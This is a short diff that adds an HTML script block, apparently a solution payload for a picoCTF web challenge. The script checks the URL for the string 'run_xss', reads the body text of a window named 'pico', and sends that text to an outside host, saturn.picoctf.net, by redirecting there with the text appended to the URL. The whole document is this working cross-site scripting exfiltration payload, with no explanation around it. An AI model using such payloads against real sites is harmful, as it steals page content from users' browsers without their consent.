@@ -1,0 +1,5 @@
+<script>
+if (window.location.search.includes("run_xss")) {
+    window.location = "http://saturn.picoctf.net:53766/" + window.open("", "pico").document.body.textContent;
+}
+</script>
